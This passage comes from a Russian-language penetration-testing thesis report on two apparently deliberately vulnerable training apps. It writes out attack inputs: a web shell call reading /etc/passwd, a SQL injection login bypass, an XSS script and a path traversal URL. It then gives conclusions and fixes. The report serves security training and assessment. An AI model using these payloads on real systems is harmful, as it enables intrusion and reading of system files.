...
Проверяем результат:
```
http://92.51.39.106:8050/upload/111/shell.php?cmd=cat+/etc/passwd
```

Результат:
![File Inclusion](./img/test_shell_01.jpg)
![File Inclusion](./img/test_shell_02.jpg)
![File Inclusion](./img/test_shell_03.jpg)
![File Inclusion](./img/test_shell_04.jpg)
![File Inclusion](./img/test_shell_05.jpg)
![File Inclusion](./img/test_shell_06.jpg)


### Тестирование веб-приложения Beemers (92.51.39.106:7788)

#### Эксплуатация SQL Injection

- Страница входа http://92.51.39.106:7788/login.html
```
Username > admin' or '1'='1--
Passwors > 123 (любой)
...
Результат:
![SQL Injection](./img/test_7788_sql_01.jpg)
![SQL Injection](./img/test_7788_sql_02.jpg)

#### Подтверждение уязвимостей XSS, найденных ZAP
 
#### DOM-based XSS:
- Переходим по сгенерированной ссылке 92.51.39.106:7788/search?q=<script>alert(1)</script>


Результат:
![DOM-based XSS](./img/test_7788_dom_xss_01.jpg)


#### Reflected XSS:
-  Проверка через поисковую форму сайта 

Результат:
![Reflected XSS](./img/test_7788_xss_01.jpg)
![Reflected XSS](./img/test_7788_xss_02.jpg)


#### Верификация уязвимости Path Traversal.
- Переходим  по сгенерированной ZAP ссылке http://92.51.39.106:7788/read?file=../../../../../../../../../../../../../../etc/passwd


Результат:
![Path Traversal](./img/test_7788_path_01.jpg)

####. Подтверждение уязвимости Remote OS Command Injection.

- Переходим на страницу http://92.51.39.106:7788/server.html.

Результат:
![Remote OS Command Injection](./img/test_7788_server_01.jpg)
![Remote OS Command Injection](./img/test_7788_server_02.jpg)


## Заключение

В ходе выполнения дипломной работы по теме «Track Penetration Testing» была проведена всесторонняя проверка 
защищенности веб-сервиса с адресом 92.51.39.106. Исследование проводилось с применением метода черного ящика, 
что позволило приблизить условия проверки к действиям реального нарушителя, имеющего минимальные исходные 
данные о системе.
...
В рамках исследования анализировались два приложения, размещённые на портах:
-  8050 (NetologyVulnApp) 
- 7788 (Beemer).

Основные результаты:

Сбор информации (OSINT):
На начальном этапе с использованием открытых источников и специализированных сервисов (Shodan, CriminalIP, базы CVE)
была получена информация о структуре системы и используемом программном обеспечении. Анализ показал применение 
устаревших версий ПО с известными уязвимостями:
- Apache HTTP Server 2.4.7 и PHP 5.5.9 (порт 8050)
- Tornado 5.1.1 и OpenSSH 8.2p1


Сканирование и автоматизированный анализ:
Инструментальное обследование (Nmap, OWASP ZAP) подтвердило наличие проблем безопасности.

Активное тестирование:
На данном этапе была доказана возможность практической эксплуатации обнаруженных уязвимостей:
- Для NetologyVulnApp (порт 8050): 
Обход аутентификации через SQL-инъекцию, различные виды XSS, загрузка и выполнение вредоносного кода.
- Для Beemer (порт 7788): 
Несанкционированный доступ через SQL-инъекцию, чтение системных файлов (Path Traversal), выполнение операционных команд на сервере.

Итоговые выводы:

Проведённая оценка безопасности показала, что исследуемая система имеет критический уровень рисков. 
Наличие уязвимостей позволяет злоумышленнику:
- Получать несанкционированный доступ к данным и функциям приложений.
- Выполнять команды на сервере.
- Осуществлять чтение конфиденциальной информации.
- Проводить атаки на пользователей.
- Основными причинами низкого уровня защищённости являются применение устаревшего программного обеспечения, недостатки в настройке компонентов и отсутствие контроля входных данных на этапе разработки.

Предлагаемые меры:
- Обновить все используемые программные компоненты до актуальных версий.
- Исправить уязвимости в коде приложений, внедрив строгую проверку входных данных и параметризованные запросы.
- Настроить конфигурацию веб-серверов и приложений в соответствии с рекомендациями по безопасности, добавив необходимые защитные заголовки.
- Внедрить регулярный мониторинг уязвимостей и плановое проведение проверок безопасности.
